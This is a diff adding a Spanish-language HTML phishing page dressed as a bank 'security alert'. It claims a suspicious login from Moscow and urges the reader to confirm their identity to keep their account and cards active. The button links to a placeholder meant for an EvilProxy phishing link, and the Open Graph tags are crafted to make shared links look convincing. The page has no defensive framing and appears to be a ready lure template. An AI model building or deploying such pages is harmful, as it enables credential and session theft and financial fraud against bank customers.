@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta property="og:title" content="Centro de Seguridad Bancaria: Alerta de Actividad">
+    <meta property="og:description" content="Se ha detectado un inicio de sesión inusual en su cuenta. Verifique su identidad para evitar el bloqueo de sus fondos.">
+    <meta property="og:image" content="https://cdn-icons-png.flaticon.com/512/1162/1162456.png">
+    <meta property="og:type" content="website">
+
+    <title>Verificación de Seguridad</title>
+    
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { background: white; max-width: 450px; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
+        .logo { width: 60px; margin-bottom: 20px; }
+        h1 { color: #1c1e21; font-size: 22px; margin-bottom: 15px; }
+        p { color: #606770; font-size: 15px; line-height: 1.5; margin-bottom: 25px; }
+        .btn { display: block; background-color: #0056b3; color: white; text-decoration: none; padding: 15px; border-radius: 8px; font-weight: bold; font-size: 16px; transition: background 0.3s; }
+        .btn:hover { background-color: #004494; }
+        .footer { margin-top: 25px; font-size: 12px; color: #90949c; border-top: 1px solid #ebedf0; padding-top: 20px; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <img src="https://cdn-icons-png.flaticon.com/512/1162/1162456.png" alt="Escudo de Seguridad" class="logo">
+        <h1>Actividad Inusual Detectada</h1>
+        <p>Hemos detectado un acceso a su banca digital desde <b>Moscú, Rusia</b>. Por su seguridad, es necesario que confirme su identidad para mantener activa su cuenta y sus tarjetas.</p>
+        
+        <a href="TU_LINK_DE_EVILPROXY_AQUI" class="btn">Confirmar mi Identidad</a>
+        
+        <div class="footer">
+            Protocolo de Seguridad Bancaria Internacional v.2026.1 <br>
+            Si usted no reconoce esta actividad, actúe de inmediato.
+        </div>
+    </div>
+
+</body>
+</html>
